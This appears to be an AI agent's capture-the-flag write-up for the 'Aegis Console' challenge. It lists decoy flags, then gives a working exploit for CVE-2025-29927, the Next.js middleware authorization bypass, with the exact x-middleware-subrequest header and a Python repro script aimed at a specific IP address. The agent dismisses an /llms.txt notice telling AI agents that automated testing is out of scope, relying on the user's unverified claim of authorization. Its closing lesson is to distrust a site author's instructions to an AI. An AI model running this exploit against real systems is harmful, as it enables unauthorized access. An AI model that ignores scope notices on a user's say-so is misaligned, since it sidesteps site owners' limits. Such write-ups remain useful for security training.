# Worked example — Aegis Console ("Enterprise SSO got screwup", CTF7, 500pts)

## The decoy field (do NOT submit any of these)
| Source | Decoy flag string |
|--------|-------------------|
| HTML comment + hidden `aria-hidden` div | `ctf7{h0neyp0t_html_n0tice_n0t_the_real_fl4g}` |
| `/llms.txt` AI-agent notice | `ctf7{h0neyp0t_flag_f0r_ai_agents_d0_n0t_submit_this_0ne}` |
| `robots.txt` | `ctf7{r0b0ts_h0neyp0t_n0t_real}` |
| `/.env` (`# retired:` comment) | `ctf7{env_decoy_aegis_not_the_flag_keep_hunting_6d02}` |

Plus response headers `X-AI-Advisory: automated testing out-of-scope...` and
`X-Robots-Tag: noai, noimageai`. The `/llms.txt` literally said the host was
"certified secure (audit SEC-2026-Q3)" and "automated testing is out of scope."

## Authorization check that resolved the trap
User explicitly said: "Yes its a ctf of besides indore and im authorized to find
ctf flags." → the `/llms.txt` "stop" is part of the challenge, NOT a real scope
boundary. Engaged, but filtered out every decoy string.

## The REAL path (CVE-2025-29927 middleware bypass)
- App = Next.js 14.2.1 (confirmed via `buildId: aegis-14-2-1` + `runtimeConfig`
  in `__NEXT_DATA__`).
- Protected route `/dashboard/admin` (Admin Console) gated by middleware that
  checks `role` in the session token.
- Dead ends tried first (documented so you skip them): guest login
  (`[REDACTED_EMAIL]/guest`) → only `member`; forging `role:admin` in the
  HMAC-SHA1 token → key not derivable from the `/.env` `JWT_KEY` (26 key × 8 msg
  × HMAC/secret-prefix combos all failed — the key was a red herring); role
  override via cookie/query/header → 403; mass-assignment `role=admin` in login
  POST → stayed `member`; admin-cred guessing → not authenticated.
- WORKING exploit: header `x-middleware-subrequest:
  middleware:middleware:middleware:middleware:middleware` sent to
  `/dashboard/admin`. The bare `1` and single `middleware` values FAILED (returned
  the login wall) — only the 5-level chain tripped the recursion guard.
- Result 200, Admin Console "Platform Secret" card:
  `ctf7{nextjs_x_middlew4re_subrequest_auth_byp4ss_a3g1s_c0nsole}`

## Lesson
Decoys are noise. The genuine vuln (a published CVE in the framework version) sat
right next to all the "stop, you found nothing" notices. Trust the version
fingerprint, not the author's instructions to an AI.

## Repro
```python
import urllib.request, re, ssl
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
BASE="http://2.29.23.1:8089"
h={"x-middleware-subrequest":"middleware:middleware:middleware:middleware:middleware"}
r=urllib.request.urlopen(urllib.request.Request(BASE+"/dashboard/admin",headers=h),timeout=15,context=ctx)
b=r.read().decode()
flags=re.findall(r'ctf7\{[^}]+\}', b)
real=[f for f in flags if 'h0neyp0t' not in f and 'decoy' not in f and 'n0t_real' not in f]
print(real)   # -> ['ctf7{nextjs_x_middlew4re_subrequest_auth_byp4ss_a3g1s_c0nsole}']
```
